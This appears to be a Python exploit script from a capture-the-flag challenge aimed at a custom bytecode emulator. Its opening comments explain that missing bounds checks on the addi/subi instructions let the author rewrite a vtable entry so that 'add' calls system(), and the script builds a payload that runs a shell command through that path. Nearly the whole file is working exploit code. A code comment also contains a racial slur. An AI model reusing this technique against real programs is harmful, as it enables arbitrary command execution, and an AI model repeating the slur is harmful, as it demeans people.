# neither the addi nor the subi instructions did any bounds checking for
# registers. I used subi to modify the vtable entry for "add" by subtracting
# the right amount so that it pointed to system in the plt. the emulator
# was nice enough to take all the bytes after the opcode and pass them as the
# first argument.

import struct, sys

instructions = {
        'add':  0,
        'addi': 1,
        'sub':  2,
        'subi': 3,
        'mul':  4,
        'div':  5,
        'xor':  6,
        'and':  7,
        'or':   8,
        'term': 9,
}

regs = {
        'REG0': 0,
        'REG1': 1,
        'REG2': 2,
        'REG3': 3,
        'REG4': 4,
        'REG5': 5,
        'REG6': 6,
        'REG7': 7,
        'VTAB': 48,
        'STR' : 12,
}

# a simple assembler to make playing with the emulator a little easier
def instruction_r(mnem, reg1, reg2, reg3):
        return chr(instructions[mnem]) + chr(regs[reg1]) + chr(regs[reg2]) + chr(regs[reg3])

def instruction_i(mnem, reg1, imm):
        return chr(instructions[mnem]) + chr(regs[reg1]) + struct.pack(">H", imm)

def term():
        return chr(instructions['term']) + chr(0)

original = 0x1e80
system = 0x4010D0 # <- jump to this nigga, move controlable string to $rdi
target = 0xcccc
target = system & 0xFFFF
offset = target - original
sys.stdout.write(
        ''.join([
        instruction_i('subi', 'VTAB', abs(offset)),             # put `system` in main::add
        "\x00mkdir w\x00",                                      # call add with our "arguments"
        ])
)
